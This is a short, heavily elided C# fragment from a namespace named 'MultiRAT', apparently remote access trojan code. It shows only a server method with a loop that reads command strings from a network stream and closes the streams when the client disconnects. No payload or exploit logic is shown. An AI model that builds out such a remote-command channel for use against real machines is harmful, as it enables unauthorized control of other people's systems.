...
namespace MultiRAT
{
    ...
    {
             // Establishing the needed classes.      
            ...
            private void RunServer()
            {
                ...
                {
                    string line;
                    //Command loop, LastIndexOf is to search within the Network Stream for any command strings sent by the Client.
                ...
                catch (Exception err) //If Client suddenly disconnects do this.
                {
                    streamReader.Close();
                    networkStream.Close();
